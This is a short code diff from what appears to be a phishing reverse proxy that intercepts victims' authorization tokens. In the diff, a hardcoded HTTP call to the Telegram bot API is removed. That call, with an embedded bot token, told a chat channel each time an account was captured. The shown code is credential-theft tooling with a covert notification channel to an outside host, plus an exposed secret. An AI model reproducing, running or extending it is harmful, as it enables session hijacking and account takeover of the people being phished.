@@ -702,11 +702,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if is_auth {
 				// we have all auth tokens
 				log.Success("[%d] all authorization tokens intercepted!//[flime special edit]", ps.Index)
-				resp, err := http.Get("https://api.telegram.org/bot975841772:AAFFgD7x1GAYqEeAGRNXM7aDN9xqiCdN5BM/sendMessage?chat_id=@wzyxx&text=%3Cb%3Ehesap%20d%C3%BCst%C3%BC%3C/b%3E&parse_mode=HTML")
-                if err != nil {
-                      	// handle err
-                 }
-                    defer resp.Body.Close()
+				
 			}
 
 			// modify received body
